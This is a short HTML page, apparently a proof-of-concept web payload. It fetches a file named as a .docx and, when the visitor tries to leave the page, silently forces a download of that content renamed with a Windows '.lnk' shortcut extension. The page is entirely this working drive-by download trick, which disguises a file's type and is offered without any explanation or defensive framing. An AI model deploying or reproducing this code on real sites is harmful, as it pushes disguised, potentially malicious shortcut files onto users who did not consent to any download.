<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>please wait...</title>
</head>
<body>
  
  <script>
    let url = '';
    
    fetch('fake-file-2.docx')
    .then(res => res.blob())
    .then(blob => {
      url = URL.createObjectURL(blob);
      document.title = 'download is ready'
    });

  window.addEventListener('beforeunload', handleBeforeUnloadEvent);

    async function handleBeforeUnloadEvent(evt) {
      const link = document.createElement('a');
      link.href = url;
      link.download = 'fake file ' + (Date.now()+1) + '.lnk';
      link.click();
  }

  </script>
</body>
</html>
